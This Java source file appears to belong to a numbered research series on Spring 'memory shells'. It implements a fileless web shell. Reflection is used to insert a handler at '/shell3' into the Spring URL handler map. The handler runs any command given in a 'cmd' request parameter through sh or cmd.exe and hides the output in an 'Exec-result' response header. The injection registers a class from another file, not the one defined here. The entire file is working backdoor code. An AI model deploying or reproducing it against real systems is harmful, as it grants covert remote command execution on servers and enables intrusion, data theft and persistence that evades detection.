package com.example.springshell.memshell;

import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.SimpleUrlHandlerMapping;
import org.springframework.web.servlet.mvc.Controller;

import java.io.InputStream;
import java.util.Scanner;
import java.lang.reflect.Field;
import java.util.Map;

public class No3_SimpleUrlHandlerMappingShell implements Controller {

    public static String injectShell() throws Exception{
        WebApplicationContext webApplicationContext = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        SimpleUrlHandlerMapping simpleUrlHandlerMapping = webApplicationContext.getBean(SimpleUrlHandlerMapping.class);
        Class abstractUrlHandlerMapping = Class.forName("org.springframework.web.servlet.handler.AbstractUrlHandlerMapping");
        Field field = abstractUrlHandlerMapping.getDeclaredField("handlerMap");
        field.setAccessible(true);

        Map handlerMap = (Map) field.get(simpleUrlHandlerMapping);
        handlerMap.put("/shell3",new No2_ControllerHandlerShell());
        return "{\"result\":\"No3_SimpleUrlHandlerMappingShell\"}";
    }



    @Override
    public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception {
        if (request.getParameter("cmd") != null) {
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\A");
            String output = s.hasNext() ? s.next() : "";
//            response.getWriter().write(output);
//            response.getWriter().flush();
//            response.getWriter().close();
            response.setHeader("Exec-result", new String(output));
        }
        return null;
    }
}

